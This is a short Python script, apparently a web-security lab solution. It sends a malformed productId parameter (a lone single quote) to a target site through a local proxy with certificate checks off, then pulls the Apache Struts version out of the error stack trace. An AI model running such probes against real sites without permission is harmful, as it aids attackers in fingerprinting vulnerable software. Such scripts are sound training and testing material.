import requests
import urllib3
import re
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def find_version(url):
    product_path = "/product?productId='"
    product_url = url + product_path
    res = requests.get(product_url, verify=False, proxies=proxies)
    if res.status_code == 500:
        print("(+) Found third party framework...")
        print("(+) Finding the third party framwork verison...")
        print("(+) Following is the stack trace: ")
        print(res.text)
        version = re.search("Apache Struts (.*)", res.text).group(1)
        print("(+) Version of the framework is:", version)
    else:
        print("(-) Unable to find any information on third party framework!")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Try to find the third party framework's version...")
    find_version(url)
    
if __name__ == "__main__":
    main()